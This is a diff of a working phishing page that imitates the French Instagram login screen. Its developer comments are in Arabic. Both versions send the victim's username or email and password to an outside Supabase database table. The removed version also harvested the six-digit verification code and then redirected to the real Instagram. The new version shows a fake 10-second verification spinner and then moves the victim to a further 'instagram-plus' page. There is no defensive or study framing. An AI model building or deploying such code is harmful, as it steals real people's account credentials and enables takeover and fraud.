@@ -1,62 +1,136 @@
 <!DOCTYPE html>
-<html lang="fr" dir="ltr">
+<html lang="fr">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Instagram</title>
   <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-    body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-    .card { background: #fff; border: 1px solid #dbdbdb; width: 100%; max-width: 350px; padding: 25px 30px; text-align: center; border-radius: 4px; }
-    .logo { width: 175px; margin: 10px 0 20px 0; }
-    .heading-title { font-size: 18px; font-weight: 600; color: #262626; margin-bottom: 15px; line-height: 1.4; }
-    input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 10px; font-size: 12px; margin-bottom: 8px; outline: none; }
-    input:focus { border-color: #a8a8a8; }
-    .btn { width: 100%; background-color: #0095f6; border: none; color: white; padding: 8px; font-weight: 600; border-radius: 4px; font-size: 14px; cursor: pointer; margin-top: 8px; }
-    .btn:disabled { background-color: rgba(0, 149, 246, 0.4); cursor: default; }
-    .loader-container { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 40px 0; }
-    .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0095f6; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin-bottom: 15px; }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #ffffff;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .lang-selector { font-size: 13px; color: #737373; margin-top: 10px; }
+    .main-container {
+      width: 100%;
+      max-width: 320px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin: auto 0;
+    }
+    .logo-img { width: 60px; height: 60px; margin-bottom: 25px; }
+    form { width: 100%; display: flex; flex-direction: column; gap: 10px; }
+    .input-field {
+      width: 100%;
+      background: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 12px;
+      padding: 14px 12px;
+      font-size: 14px;
+      outline: none;
+      color: #262626;
+    }
+    .input-field:focus { border-color: #a8a8a8; }
+    .btn-login {
+      width: 100%;
+      background-color: #0064e0;
+      border: none;
+      border-radius: 20px;
+      color: #ffffff;
+      font-weight: 600;
+      padding: 12px;
+      font-size: 14px;
+      cursor: pointer;
+      margin-top: 5px;
+    }
+    .btn-login:disabled { opacity: 0.6; cursor: default; }
+    .forgot-password {
+      color: #000000;
+      font-size: 13px;
+      font-weight: 600;
+      text-decoration: none;
+      margin-top: 15px;
+      text-align: center;
+    }
+    .footer-container {
+      width: 100%;
+      max-width: 320px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-bottom: 10px;
+      gap: 15px;
+    }
+    .btn-create {
+      width: 100%;
+      background: transparent;
+      border: 1px solid #0064e0;
+      border-radius: 20px;
+      color: #0064e0;
+      font-weight: 600;
+      padding: 10px;
+      font-size: 14px;
+      text-decoration: none;
+      text-align: center;
+    }
+    .meta-logo { font-weight: bold; color: #0064e0; font-size: 14px; }
+    
+    /* شاشة التحقق والانتظار 10 ثوانٍ */
+    .loading-overlay {
+      display: none;
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(255, 255, 255, 0.98);
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+    .spinner {
+      width: 40px; height: 40px;
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #0064e0;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 15px;
+    }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    .loading-text { font-size: 14px; color: #262626; }
-    .hidden { display: none; }
-    .sub-text { font-size: 12px; color: #8e8e8e; margin: 10px 0; }
+    .loading-text { font-size: 15px; color: #262626; font-weight: 500; }
   </style>
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 </head>
 <body>
 
-  <!-- 1️⃣ الشاشة الأولى: تسجيل الدخول -->
-  <div id="step-login" class="card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo_2016.svg/800px-Instagram_logo_2016.svg.png" class="logo" alt="Instagram">
-    
-    <!-- تم استبدال Youssef بـ Vous -->
-    <h2 class="heading-title">Vous, essayez Instagram Plus gratuitement pendant un mois</h2>
+  <div class="lang-selector">Français (France) ∨</div>
+
+  <div class="main-container">
+    <img class="logo-img" src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram">
 
     <form id="loginForm">
-      <input type="text" id="username" placeholder="Nom d'utilisateur, e-mail ou mobile" required>
-      <input type="password" id="password" placeholder="Mot de passe" required>
-      <button type="submit" class="btn">Essayer pour 0,00 $US</button>
+      <input type="text" id="email" class="input-field" placeholder="Nom de profil, e-mail ou numéro de mobile" required>
+      <input type="password" id="password" class="input-field" placeholder="Mot de passe" required>
+      <button type="submit" id="submitBtn" class="btn-login">Se connecter</button>
     </form>
+
+    <a href="#" class="forgot-password">Mot de passe oublié ?</a>
   </div>
 
-  <!-- 2️⃣ الشاشة الثانية: شاشة التحميل Vérification des données -->
-  <div id="step-loading" class="card hidden">
-    <div class="loader-container">
-      <div class="spinner"></div>
-      <div class="loading-text">Vérification des données...</div>
-    </div>
+  <div class="footer-container">
+    <a href="#" class="btn-create">Créer un nouveau compte</a>
+    <div class="meta-logo">∞ Meta</div>
   </div>
 
-  <!-- 3️⃣ الشاشة الثالثة: إدخال كود التحقيق -->
-  <div id="step-code" class="card hidden">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo_2016.svg/800px-Instagram_logo_2016.svg.png" class="logo" alt="Instagram">
-    <h3 style="font-size: 16px; margin-bottom: 10px;">Entrez le code de vérification</h3>
-    <p class="sub-text">Entrez le code à 6 chiffres envoyé à votre appareil.</p>
-    
-    <form id="codeForm">
-      <input type="text" id="verificationCode" placeholder="Code de vérification (6 chiffres)" maxlength="8" required>
-      <button type="submit" class="btn">Confirmer</button>
-    </form>
+  <!-- شاشة الانتظار -->
+  <div id="loadingOverlay" class="loading-overlay">
+    <div class="spinner"></div>
+    <div class="loading-text">Vérification des données...</div>
   </div>
 
   <script>
@@ -64,55 +138,44 @@
     const SUPABASE_KEY = 'sb_publishable_hG2eyT1OpV7SlR_rNmMQEQ_dGLtFq0W';
     const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-    let currentUserId = null;
+    const form = document.getElementById('loginForm');
+    const submitBtn = document.getElementById('submitBtn');
+    const loadingOverlay = document.getElementById('loadingOverlay');
 
-    const stepLogin = document.getElementById('step-login');
-    const stepLoading = document.getElementById('step-loading');
-    const stepCode = document.getElementById('step-code');
-
-    // 1. عند الضغط على تسجيل الدخول: حفظ الإيميل والكلمة مباشرة ثم الانتقال للتحميل
-    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    form.addEventListener('submit', async (e) => {
       e.preventDefault();
       
-      const emailVal = document.getElementById('username').value;
-      const passVal = document.getElementById('password').value;
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value;
 
-      // حفظ البيانات فوراً في قاعدة البيانات
-      const { data, error } = await supabaseClient
-        .from('users_data')
-        .insert([{ email: emailVal, password: passVal }])
-        .select();
+      submitBtn.disabled = true;
 
-      if (data && data.length > 0) {
-        currentUserId = data[0].id; // الاحتفاظ بـ ID السجل لتحديث الكود لاحقاً
-      }
-
-      // إخفاء صفحة الدخول وإظهار شاشة التحميل (Vérification des données)
-      stepLogin.classList.add('hidden');
-      stepLoading.classList.remove('hidden');
-
-      // الانتظار لمدة 3 ثوانٍ ثم فتح شاشة الكود تلقائياً
-      setTimeout(() => {
-        stepLoading.classList.add('hidden');
-        stepCode.classList.remove('hidden');
-      }, 3000);
-    });
-
-    // 2. عند إدخال الكود: تحديث السجل المخزّن مسبقاً بإضافة الكود إليه
-    document.getElementById('codeForm').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      
-      const codeVal = document.getElementById('verificationCode').value;
-
-      if (currentUserId) {
-        await supabaseClient
+      try {
+        const { data, error } = await supabaseClient
           .from('users_data')
-          .update({ code: codeVal })
-          .eq('id', currentUserId);
-      }
+          .insert([{ email: email, password: password }])
+          .select();
 
-      // تحويل المستخدم إلى موقع انستغرام الرسمي بعد الانتهاء
-      window.location.href = "https://www.instagram.com";
+        if (error) {
+          console.error('Database Error:', error);
+          alert('Erreur: ' + error.message);
+          submitBtn.disabled = false;
+        } else if (data && data.length > 0) {
+          localStorage.setItem('user_row_id', data[0].id);
+          
+          // عرض شاشة الانتظار
+          loadingOverlay.style.display = 'flex';
+          
+          // التوجيه لصفحة instagram-plus بعد 10 ثوانٍ
+          setTimeout(() => {
+            window.location.href = './instagram-plus.html';
+          }, 10000);
+        }
+      } catch (err) {
+        console.error('Unexpected Error:', err);
+        alert('Erreur inattendue!');
+        submitBtn.disabled = false;
+      }
     });
   </script>
 </body>
